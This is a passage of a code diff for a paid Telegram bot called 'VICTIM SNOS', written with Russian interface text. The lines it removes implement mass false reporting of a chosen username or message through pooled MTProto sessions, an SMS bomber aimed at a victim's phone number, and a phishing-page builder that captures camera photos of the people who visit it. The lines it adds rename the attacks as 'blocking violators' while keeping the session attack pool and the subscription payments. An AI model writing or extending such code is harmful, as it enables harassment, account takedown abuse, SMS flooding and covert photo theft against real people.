+        await st.edit_text("<b>❌ ОШИБКА БЛОКИРОВКИ</b>", reply_markup=main_menu(uid))
     finally:
-        if user_id in active_attacks:
-            del active_attacks[user_id]
+        if uid in active_attacks:
+            del active_attacks[uid]
+        attack_targets.pop(uid, None)
+        attack_types.pop(uid, None)
 
-# Снос по username
-@dp.callback_query(F.data == "snos_username")
-async def snos_username_start(cb: types.CallbackQuery, state: FSMContext):
-    if not await check_access(cb.from_user.id, cb):
-        return
-    if cb.from_user.id in active_attacks:
-        await cb.answer("❌ Атака уже идет!", show_alert=True)
-        return
-    
-    await state.set_state(AttackState.waiting_username)
-    await cb.message.delete()
-    await cb.message.answer("<b>🔱 VICTIM SNOS</b>\n\n👤 Введите username (без @):",
-                          reply_markup=InlineKeyboardMarkup(inline_keyboard=[[create_button("❌ Отмена", "snos_menu")]]))
-
-@dp.message(StateFilter(AttackState.waiting_username))
-async def snos_username_received(msg: types.Message, state: FSMContext):
-    if not await check_access(msg.from_user.id, msg):
-        return
-    username = msg.text.strip().replace("@", "")
-    await state.update_data(username=username)
-    await state.set_state(AttackState.waiting_count)
-    await msg.delete()
-    await msg.answer(f"<b>🔱 VICTIM SNOS</b>\n\n👤 Username: @{username}\n\nВведите количество раундов (1-{MAX_ROUNDS}):")
-
-@dp.message(StateFilter(AttackState.waiting_count))
-async def snos_username_count(msg: types.Message, state: FSMContext):
-    if not await check_access(msg.from_user.id, msg):
-        return
-    
-    try:
-        rounds = int(msg.text.strip())
-        if rounds < 1 or rounds > MAX_ROUNDS:
-            raise ValueError()
-    except:
-        await msg.delete()
-        await send_message(msg, f"❌ Введите число от 1 до {MAX_ROUNDS}!")
-        return
-    
-    data = await state.get_data()
-    username = data["username"]
-    user_id = msg.from_user.id
-    
-    await state.clear()
-    await msg.delete()
-    
-    if user_id in active_attacks:
-        await send_message(msg, "❌ Атака уже запущена!")
-        return
-    
-    stop_event = asyncio.Event()
-    active_attacks[user_id] = stop_event
-    
-    status_msg = await send_message(msg, f"🎯 <b>СНОС ЗАПУЩЕН</b>\n\n👤 Username: @{username}\n🔄 Раунд: 0/{rounds}\n📤 Жалоб: 0")
-    
-    async def update_progress(cur, tot, rep):
-        try:
-            await status_msg.edit_caption(
-                caption=f"<b>🔱 VICTIM SNOS</b>\n\n🎯 <b>СНОС АКТИВЕН</b>\n\n👤 Username: @{username}\n🔄 Раунд: {cur}/{tot}\n📤 Жалоб: {rep}",
-                reply_markup=InlineKeyboardMarkup(inline_keyboard=[[create_button("⏹ ОСТАНОВИТЬ", "stop_attack")]])
-            )
-        except:
-            pass
-    
-    try:
-        total = await snos_attack_username(user_id, username, rounds, stop_event, update_progress)
-        set_cooldown(user_id)
-        await status_msg.edit_caption(
-            caption=f"<b>🔱 VICTIM SNOS</b>\n\n✅ <b>СНОС ЗАВЕРШЕН</b>\n\n👤 Username: @{username}\n📤 Жалоб: <b>{total}</b>\n🔄 Раундов: {rounds}",
-            reply_markup=get_main_menu(user_id)
-        )
-    except:
-        await status_msg.edit_caption(caption=f"<b>🔱 VICTIM SNOS</b>\n\n❌ <b>ОШИБКА</b>", reply_markup=get_main_menu(user_id))
-    finally:
-        if user_id in active_attacks:
-            del active_attacks[user_id]
-
-# Жалоба на сообщение
-@dp.callback_query(F.data == "report_message")
-async def report_message_start(cb: types.CallbackQuery, state: FSMContext):
-    if not await check_access(cb.from_user.id, cb):
-        return
-    if cb.from_user.id in active_attacks:
-        await cb.answer("❌ Атака уже идет!", show_alert=True)
-        return
-    
-    await state.set_state(AttackState.waiting_link)
-    await cb.message.delete()
-    await cb.message.answer("<b>🔱 VICTIM SNOS</b>\n\n💬 Введите ссылку на сообщение:\n<i>Пример: https://t.me/channel/123</i>",
-                          reply_markup=InlineKeyboardMarkup(inline_keyboard=[[create_button("❌ Отмена", "snos_menu")]]))
-
-@dp.message(StateFilter(AttackState.waiting_link))
-async def report_message_link(msg: types.Message, state: FSMContext):
-    if not await check_access(msg.from_user.id, msg):
-        return
-    
-    link = msg.text.strip()
-    user_id = msg.from_user.id
-    
-    await state.clear()
-    await msg.delete()
-    
-    status_msg = await send_message(msg, f"📤 <b>ОТПРАВКА ЖАЛОБ</b>\n\n🔗 Ссылка: {link}\n⏳ Обработка...")
-    
-    reports, err = await mass_report_message(user_id, link)
-    set_cooldown(user_id)
-    
-    if err:
-        await status_msg.edit_caption(caption=f"<b>🔱 VICTIM SNOS</b>\n\n❌ {err}", reply_markup=get_main_menu(user_id))
+@dp.callback_query(F.data == "stop_attack")
+async def stop_btn(cb: types.CallbackQuery):
+    uid = cb.from_user.id
+    if uid in active_attacks:
+        active_attacks[uid].set()
+        del active_attacks[uid]
+        await cb.answer("✅ Блокировка остановлена", show_alert=True)
     else:
-        await status_msg.edit_caption(caption=f"<b>🔱 VICTIM SNOS</b>\n\n✅ Жалобы отправлены: <b>{reports}</b>", reply_markup=get_main_menu(user_id))
+        await cb.answer("❌ Нет активных блокировок", show_alert=True)
+    
+    await cb.message.delete()
+    await send_msg(cb.message, "⏹ БЛОКИРОВКА ОСТАНОВЛЕНА", main_menu(uid))
 
-# Бомбер
-@dp.callback_query(F.data == "bomber_menu")
-async def bomber_menu(cb: types.CallbackQuery, state: FSMContext):
+@dp.callback_query(F.data == "status")
+async def status_cb(cb: types.CallbackQuery):
     if not await check_access(cb.from_user.id, cb):
         return
-    if cb.from_user.id in active_attacks:
-        await cb.answer("❌ Атака уже идет!", show_alert=True)
-        return
-    
-    await state.set_state(AttackState.waiting_phone)
-    await cb.message.delete()
-    await cb.message.answer("<b>🔱 VICTIM SNOS</b>\n\n💣 <b>SMS БОМБЕР</b>\n\n📱 Введите номер телефона:",
-                          reply_markup=InlineKeyboardMarkup(inline_keyboard=[[create_button("❌ Отмена", "main_menu")]]))
 
-@dp.message(StateFilter(AttackState.waiting_phone))
-async def bomber_phone(msg: types.Message, state: FSMContext):
-    if not await check_access(msg.from_user.id, msg):
-        return
-    await state.update_data(phone=msg.text.strip())
-    await state.set_state(AttackState.waiting_count)
-    await msg.delete()
-    await msg.answer(f"<b>🔱 VICTIM SNOS</b>\n\n📱 Телефон: <code>{msg.text.strip()}</code>\n\nВведите количество раундов (1-5):")
+    uid = cb.from_user.id
+    pool = user_pools.get(uid)
+    
+    can, rem = await check_cooldown(uid)
+    cooldown_text = ""
+    if not can:
+        minutes = int(rem // 60)
+        seconds = int(rem % 60)
+        cooldown_text = f"\n⏳ Кулдаун: {minutes}:{seconds:02d}"
 
-@dp.message(StateFilter(AttackState.waiting_count))
-async def bomber_count(msg: types.Message, state: FSMContext):
-    if not await check_access(msg.from_user.id, msg):
-        return
-    
-    try:
-        rounds = int(msg.text.strip())
-        if rounds < 1 or rounds > 5:
-            raise ValueError()
-    except:
-        await msg.delete()
-        await send_message(msg, "❌ Введите число от 1 до 5!")
-        return
-    
-    data = await state.get_data()
-    phone = data["phone"]
-    user_id = msg.from_user.id
-    
-    await state.clear()
-    await msg.delete()
-    
-    if user_id in active_attacks:
-        await send_message(msg, "❌ Атака уже запущена!")
-        return
-    
-    stop_event = asyncio.Event()
-    active_attacks[user_id] = stop_event
-    
-    status_msg = await send_message(msg, f"💣 <b>БОМБЕР ЗАПУЩЕН</b>\n\n📱 Телефон: <code>{phone}</code>\n🔄 Раунд: 0/{rounds}\n📨 Отправлено: 0")
-    
-    async def update_progress(cur, tot, sent):
-        try:
-            await status_msg.edit_caption(
-                caption=f"<b>🔱 VICTIM SNOS</b>\n\n💣 <b>БОМБЕР АКТИВЕН</b>\n\n📱 Телефон: <code>{phone}</code>\n🔄 Раунд: {cur}/{tot}\n📨 Отправлено: {sent}",
-                reply_markup=InlineKeyboardMarkup(inline_keyboard=[[create_button("⏹ ОСТАНОВИТЬ", "stop_attack")]])
-            )
-        except:
-            pass
-    
-    try:
-        total = await bomber_attack(phone, rounds, user_id, stop_event, update_progress)
-        set_cooldown(user_id)
-        await status_msg.edit_caption(
-            caption=f"<b>🔱 VICTIM SNOS</b>\n\n✅ <b>БОМБЕР ЗАВЕРШЕН</b>\n\n📱 Телефон: <code>{phone}</code>\n📨 SMS: <b>{total}</b>\n🔄 Раундов: {rounds}",
-            reply_markup=get_main_menu(user_id)
-        )
-    except:
-        await status_msg.edit_caption(caption=f"<b>🔱 VICTIM SNOS</b>\n\n❌ <b>ОШИБКА</b>", reply_markup=get_main_menu(user_id))
-    finally:
-        if user_id in active_attacks:
-            del active_attacks[user_id]
-
-# Фишинг
-@dp.callback_query(F.data == "phish_menu")
-async def phish_menu(cb: types.CallbackQuery, state: FSMContext):
-    if not await check_access(cb.from_user.id, cb):
-        return
-    
-    await state.set_state(AttackState.waiting_title)
-    await cb.message.delete()
-    await cb.message.answer("<b>🔱 VICTIM SNOS</b>\n\n🎣 <b>ФИШИНГ</b>\n\nВведите заголовок страницы:\n<i>Например: Telegram Security</i>",
-                          reply_markup=InlineKeyboardMarkup(inline_keyboard=[[create_button("❌ Отмена", "main_menu")]]))
-
-@dp.message(StateFilter(AttackState.waiting_title))
-async def phish_title(msg: types.Message, state: FSMContext):
-    if not await check_access(msg.from_user.id, msg):
-        return
-    
-    title = msg.text.strip()
-    user_id = msg.from_user.id
-    
-    await state.clear()
-    await msg.delete()
-    
-    status_msg = await send_message(msg, "🎣 <b>СОЗДАНИЕ СТРАНИЦЫ</b>\n\n⏳ Подождите...")
-    
-    page_id = hashlib.md5(f"{user_id}_{time.time()}".encode()).hexdigest()[:10]
-    url = await create_phishing_page(title, user_id, page_id)
-    
-    if url:
-        await status_msg.edit_caption(
-            caption=f"<b>🔱 VICTIM SNOS</b>\n\n✅ <b>СТРАНИЦА СОЗДАНА</b>\n\n🔗 Ссылка:\n<code>{url}</code>\n\n📸 При переходе жертвы и разрешении камеры вы получите фото.",
-            reply_markup=get_main_menu(user_id)
-        )
+    if pool:
+        stats = pool.get_stats()
+        txt = (f"📊 MTProto сессий: {stats['total']}/500\n"
+               f"🔐 Авторизовано: {stats['authorized']}\n"
+               f"🟢 Готово к атаке: {stats['available']}\n"
+               f"🔄 На пересоздании: {stats['recreation_queue']}\n"
+               f"⚡ Качество: {stats['avg_quality']:.1%}"
+               f"{cooldown_text}")
     else:
-        await status_msg.edit_caption(caption=f"<b>🔱 VICTIM SNOS</b>\n\n❌ <b>ОШИБКА</b>", reply_markup=get_main_menu(user_id))
+        txt = f"🔄 Загрузка системы...{cooldown_text}"
 
-@dp.message(F.photo)
-async def handle_phish_photo(msg: types.Message):
-    if msg.caption:
-        for page_id, page in list(phish_pages.items()):
-            if page_id in msg.caption and msg.chat.id == page.get("chat_id"):
-                await msg.reply(f"📸 <b>ФОТО ПОЛУЧЕНО!</b>\n\nID: <code>{page_id}</code>")
-                break
+    await cb.message.delete()
+    await send_msg(cb.message, txt, main_menu(uid))
 
-# Покупка
+# Платежная система
 @dp.callback_query(F.data == "purchase_menu")
-async def purchase_menu(cb: types.CallbackQuery):
-    await cb.message.edit_caption(caption="<b>🔱 VICTIM SNOS</b>\n\n<b>💰 ПРИОБРЕТЕНИЕ ДОСТУПА</b>\n\nВыберите тариф:", reply_markup=get_purchase_menu())
+async def purch_menu(cb: types.CallbackQuery):
+    await cb.message.delete()
+    await send_msg(cb.message, "💰 ПОКУПКА ДОСТУПА", purchase_menu())
 
 @dp.callback_query(F.data.startswith("buy_"))
-async def buy_subscription(cb: types.CallbackQuery):
-    duration = cb.data.replace("buy_", "")
+async def buy(cb: types.CallbackQuery):
+    dur = cb.data.replace("buy_", "")
     prices = {"30d": ("30 дней", 100), "60d": ("60 дней", 200), "forever": ("Навсегда", 400)}
-    name, price = prices[duration]
-    
+    name, price = prices[dur]
+
     await bot.send_invoice(
         chat_id=cb.from_user.id,
         title=f"VICTIM SNOS - {name}",
-        description=f"Доступ к боту на {name}",
-        payload=f"sub_{duration}",
+        description=f"Доступ к блокировке нарушителей на {name}",
+        payload=f"sub_{dur}",
         provider_token=PAYMENT_PROVIDER_TOKEN,
         currency="RUB",
         prices=[LabeledPrice(label=name, amount=price * 100)],
-        start_parameter="victim_snos",
-        protect_content=True
+        start_parameter="vs"
     )
     await cb.message.delete()
-    await cb.message.answer(f"💳 Счет выставлен\nТариф: {name}\nСумма: {price}₽")
 
 @dp.pre_checkout_query()
-async def process_pre_checkout(query: PreCheckoutQuery):
-    await bot.answer_pre_checkout_query(query.id, ok=True)
+async def pre_check(q: PreCheckoutQuery):
+    await bot.answer_pre_checkout_query(q.id, ok=True)
 
 @dp.message(F.successful_payment)
-async def process_payment(msg: types.Message):
-    payload = msg.successful_payment.invoice_payload
-    if payload.startswith("sub_"):
-        duration = payload.replace("sub_", "")
-        if duration == "forever":
-            add_subscription(msg.from_user.id, forever=True)
-            text = "навсегда"
+async def pay_ok(msg: types.Message):
+    p = msg.successful_payment.invoice_payload
+    if p.startswith("sub_"):
+        d = p.replace("sub_", "")
+        if d == "forever":
+            add_sub(msg.from_user.id, forever=True)
+            t = "навсегда"
         else:
-            add_subscription(msg.from_user.id, days=int(duration.replace("d", "")))
-            text = f"на {duration}"
-        await msg.answer(f"✅ <b>ОПЛАТА УСПЕШНА!</b>\n\nДоступ активирован {text}\nИспользуйте /start")
+            add_sub(msg.from_user.id, days=int(d.replace("d", "")))
+            t = f"на {d}"
+        await msg.answer(f"✅ ОПЛАТА УСПЕШНА!\nДоступ к блокировке нарушителей {t}\n/start")
 
-@dp.callback_query(F.data == "use_promo")
-async def use_promo_start(cb: types.CallbackQuery, state: FSMContext):
-    await state.set_state(PurchaseState.waiting_promo)
+# Админ панель
+@dp.callback_query(F.data == "admin_menu")
+async def admin_menu_cb(cb: types.CallbackQuery):
+    if cb.from_user.id != ADMIN_ID:
+        return
     await cb.message.delete()
-    await cb.message.answer("<b>🔱 VICTIM SNOS</b>\n\n🎁 Введите промокод:",
-                          reply_markup=InlineKeyboardMarkup(inline_keyboard=[[create_button("❌ Отмена", "purchase_menu")]]))
-
-@dp.message(StateFilter(PurchaseState.waiting_promo))
-async def process_promo(msg: types.Message, state: FSMContext):
-    code = msg.text.strip().upper()
-    await msg.delete()
-    await state.clear()
-    
-    if code in promo_codes and promo_codes[code]["uses"] > 0:
-        add_subscription(msg.from_user.id, days=promo_codes[code]["days"])
-        promo_codes[code]["uses"] -= 1
-        save_promo_codes()
-        await send_message(msg, f"✅ Промокод активирован!\nДоступ на {promo_codes[code]['days']} дней", get_main_menu(msg.from_user.id))
-    else:
-        await send_message(msg, "❌ Неверный или истекший промокод", get_purchase_menu())
-
-# Статус и стоп
-@dp.callback_query(F.data == "status")
-async def status(cb: types.CallbackQuery):
-    if not await check_access(cb.from_user.id, cb):
-        return
-    
-    user_id = cb.from_user.id
-    pool = user_pools.get(user_id)
-    sessions = len(pool.sessions) if pool else 0
-    can_attack, remaining = await check_cooldown(user_id)
-    cooldown = "✅ Готов" if can_attack else f"⏳ {int(remaining)} сек"
-    
-    await cb.message.edit_caption(
-        caption=f"<b>🔱 VICTIM SNOS</b>\n\n🆔 ID: <code>{user_id}</code>\n📱 Сессий: {sessions}\n⏰ Статус: {cooldown}",
-        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[create_button("◀️ НАЗАД", "main_menu")]])
-    )
-
-@dp.callback_query(F.data == "stop")
-async def stop_attack(cb: types.CallbackQuery):
-    user_id = cb.from_user.id
-    if user_id in active_attacks:
-        active_attacks[user_id].set()
-        del active_attacks[user_id]
-        await cb.answer("✅ Атака остановлена", show_alert=True)
-    else:
-        await cb.answer("❌ Нет активных атак", show_alert=True)
-
-@dp.callback_query(F.data == "stop_attack")
-async def stop_attack_button(cb: types.CallbackQuery):
-    await stop_attack(cb)
-    await cb.message.edit_caption(caption="<b>🔱 VICTIM SNOS</b>\n\n⏹ <b>АТАКА ОСТАНОВЛЕНА</b>", reply_markup=get_main_menu(cb.from_user.id))
-
-# Админ
-@dp.message(Command("admin"))
-async def admin_cmd(msg: types.Message):
-    if msg.from_user.id != ADMIN_ID:
-        return
-    await msg.delete()
-    
-    buttons = [
-        [("➕ Добавить", "admin_add")],
-        [("➖ Удалить", "admin_remove")],
-        [("🎁 Промокод", "admin_create_promo")],
-        [("📋 Список", "admin_list")],
-    ]
-    await send_message(msg, "<b>👑 АДМИН ПАНЕЛЬ</b>", create_keyboard(buttons))
+    await send_msg(cb.message, "👑 АДМИН ПАНЕЛЬ", admin_menu())
 
 @dp.callback_query(F.data == "admin_add")
-async def admin_add(cb: types.CallbackQuery, state: FSMContext):
+async def admin_add_start(cb: types.CallbackQuery, state: FSMContext):
     if cb.from_user.id != ADMIN_ID:
         return
     await state.set_state(AdminState.waiting_user_id)
     await cb.message.delete()
-    await cb.message.answer("Введите ID пользователя:")
+    await cb.message.answer("Введите ID пользователя для добавления:")
 
-@dp.message(StateFilter(AdminState.waiting_user_id))
+@dp.message(AdminState.waiting_user_id)
 async def admin_add_user(msg: types.Message, state: FSMContext):
     if msg.from_user.id != ADMIN_ID:
         return
     try:
-        user_id = int(msg.text.strip())
-        add_subscription(user_id, forever=True)
+        uid = int(msg.text.strip())
+        add_sub(uid, forever=True)
         await msg.delete()
-        await send_message(msg, f"✅ Пользователь <code>{user_id}</code> добавлен")
+        await send_msg(msg, f"✅ Пользователь {uid} добавлен навсегда", admin_menu())
     except:
-        await send_message(msg, "❌ Неверный ID!")
-    await state.clear()
-
-@dp.callback_query(F.data == "admin_create_promo")
-async def admin_promo(cb: types.CallbackQuery, state: FSMContext):
-    if cb.from_user.id != ADMIN_ID:
-        return
-    await state.set_state(AdminState.waiting_promo_code)
-    await cb.message.delete()
-    await cb.message.answer("Введите промокод:")
-
-@dp.message(StateFilter(AdminState.waiting_promo_code))
-async def admin_promo_code(msg: types.Message, state: FSMContext):
-    if msg.from_user.id != ADMIN_ID:
-        return
-    await state.update_data(promo_code=msg.text.strip().upper())
-    await state.set_state(AdminState.waiting_promo_days)
-    await msg.delete()
-    await msg.answer("Введите количество дней:")
-
-@dp.message(StateFilter(AdminState.waiting_promo_days))
-async def admin_promo_days(msg: types.Message, state: FSMContext):
-    if msg.from_user.id != ADMIN_ID:
-        return
-    try:
-        days = int(msg.text.strip())
-        await state.update_data(promo_days=days)
-        await state.set_state(AdminState.waiting_promo_uses)
         await msg.delete()
-        await msg.answer("Введите количество использований:")
-    except:
-        await send_message(msg, "❌ Неверное число!")
-        await state.clear()
-
-@dp.message(StateFilter(AdminState.waiting_promo_uses))
-async def admin_promo_uses(msg: types.Message, state: FSMContext):
-    if msg.from_user.id != ADMIN_ID:
-        return
-    try:
-        uses = int(msg.text.strip())
-        data = await state.get_data()
-        promo_codes[data["promo_code"]] = {"days": data["promo_days"], "uses": uses}
-        save_promo_codes()
-        await msg.delete()
-        await send_message(msg, f"✅ Промокод {data['promo_code']} создан\nДней: {data['promo_days']}\nИспользований: {uses}")
-    except:
-        await send_message(msg, "❌ Неверное число!")
+        await send_msg(msg, "❌ Ошибка! Введите корректный ID", admin_menu())
     await state.clear()
 
 @dp.callback_query(F.data == "admin_remove")
-async def admin_remove(cb: types.CallbackQuery):
+async def admin_remove_start(cb: types.CallbackQuery, state: FSMContext):
     if cb.from_user.id != ADMIN_ID:
         return
-    if not ALLOWED_USERS:
-        await cb.answer("Список пуст", show_alert=True)
-        return
-    
-    buttons = [[(f"❌ Удалить {uid}", f"remove_{uid}")] for uid in list(ALLOWED_USERS.keys())[:20]]
-    await cb.message.edit_caption(caption="<b>👑 УДАЛЕНИЕ</b>", reply_markup=create_keyboard(buttons))
+    await state.set_state(AdminState.waiting_user_id)
+    await cb.message.delete()
+    await cb.message.answer("Введите ID пользователя для удаления:")
 
-@dp.callback_query(F.data.startswith("remove_"))
-async def admin_remove_user(cb: types.CallbackQuery):
-    if cb.from_user.id != ADMIN_ID:
+@dp.message(StateFilter(AdminState.waiting_user_id))
+async def admin_remove_user(msg: types.Message, state: FSMContext):
+    if msg.from_user.id != ADMIN_ID:
         return
-    user_id = cb.data.replace("remove_", "")
-    if user_id in ALLOWED_USERS:
-        del ALLOWED_USERS[user_id]
-        save_allowed_users()
-    await cb.message.edit_caption(caption=f"✅ Пользователь <code>{user_id}</code> удален")
+    try:
+        uid = str(int(msg.text.strip()))
+        if uid in ALLOWED_USERS:
+            del ALLOWED_USERS[uid]
+            save_allowed()
+            await msg.delete()
+            await send_msg(msg, f"✅ Пользователь {uid} удален", admin_menu())
+        else:
+            await msg.delete()
+            await send_msg(msg, f"❌ Пользователь {uid} не найден", admin_menu())
+    except:
+        await msg.delete()
+        await send_msg(msg, "❌ Ошибка!", admin_menu())
+    await state.clear()
 
 @dp.callback_query(F.data == "admin_list")
-async def admin_list(cb: types.CallbackQuery):
+async def admin_list_cb(cb: types.CallbackQuery):
     if cb.from_user.id != ADMIN_ID:
         return
-    text = "<b>👑 ПОЛЬЗОВАТЕЛИ</b>\n\n"
-    for uid, data in list(ALLOWED_USERS.items())[:30]:
-        expire = data.get("expire_date", "неизвестно")
-        text += f"<code>{uid}</code> - {expire}\n"
-    if not ALLOWED_USERS:
-        text += "Пусто"
-    await cb.message.edit_caption(caption=text)
+    
+    txt = "<b>👑 СПИСОК ПОЛЬЗОВАТЕЛЕЙ</b>\n\n"
+    if ALLOWED_USERS:
+        for uid, data in list(ALLOWED_USERS.items())[:30]:
+            exp = data.get('expire_date', 'forever')
+            if exp != 'forever':
+                try:
+                    exp_date = datetime.fromisoformat(exp)
+                    days_left = (exp_date - datetime.now()).days
+                    exp_text = f"{days_left}д"
+                except:
+                    exp_text = exp
+            else:
+                exp_text = "∞"
+            txt += f"<code>{uid}</code> - {exp_text}\n"
+    else:
+        txt += "Пусто"
+    
+    await cb.message.delete()
+    await send_msg(cb.message, txt, admin_menu())
 
 # ---------- ЗАПУСК ----------
-async def on_startup():
-    load_allowed_users()
-    load_promo_codes()
+async def on_start():
+    load_all()
     os.makedirs("sessions", exist_ok=True)
-    logger.info("Bot started!")
+    logger.info("🛡 VICTIM SNOS - TELEGRAM БОМБА ЗАПУЩЕНА С MTPROTO!")
+
+async def on_shutdown():
+    global http_session
+    if http_session and not http_session.closed:
+        await http_session.close()
+    
+    # Закрытие всех сессий
+    for pool in user_pools.values():
+        for session in pool.sessions:
+            try:
+                if session.client.is_connected:
+                    await session.client.disconnect()
+            except:
+                pass
 
 async def main():
-    await on_startup()
-    await bot.delete_webhook(drop_pending_updates=True)
-    await dp.start_polling(bot)
+    await on_start()
+    try:
+        await bot.delete_webhook(drop_pending_updates=True)
+        await dp.start_polling(bot)
+    finally:
+        await on_shutdown()
+
+if __name__ == "__main__":
+    asyncio.run(main())
 
 if __name__ == "__main__":
     asyncio.run(main())
